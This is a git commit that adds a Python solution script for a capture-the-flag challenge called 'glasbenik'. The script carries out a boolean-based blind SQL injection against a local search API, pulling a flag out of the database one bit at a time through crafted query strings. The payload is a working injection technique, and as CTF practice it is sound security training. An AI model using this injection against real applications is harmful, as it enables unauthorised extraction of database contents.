944fd4f5bfbd669f7180400c0e23c6598db41b82
Aljaž Medič <35614267+aljazmedic@users.noreply.github.com>
2024-04-07 23:20:32 +0200

    Add solve

---
+++ challs/glasbenik/solve/sol.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+
+import requests
+import re
+url = "http://localhost:3000/"
+path = "api/search"
+
+with requests.Session() as s:
+
+    s.get(url)
+
+    def get_bit(char_idx:int, bit_num:int):
+        bitmask = 1 << bit_num
+        payload = f"""
+            ' '
+                OR 
+                (
+                    SELECT (
+                        ASCII(
+                            SUBSTRING(
+                                (SELECT flag FROM flags LIMIT 1),
+                                {char_idx+1},
+                                1
+                            )
+                        ) & {bitmask}
+                    ) = {bitmask}
+                )
+                OR ''='
+            """.strip()
+        payload = re.sub(r"\s+", " ", payload)
+        r = s.get(url + path, params={"q": payload})
+        return len(r.json()) != 0
+
+    c = None
+    flag = ""
+    while c != '}' and len(flag) < 100:
+        character = ""
+        # Start at 7, if it's ascii 0-127,
+        #   we can start at 6
+        for i in range(6, -1, -1):
+            if get_bit(len(flag), i):
+                character += "1"
+            else:
+                character += "0"
+        print(character)
+        c = chr(int(character, 2))
+        flag += c
+        print(flag)
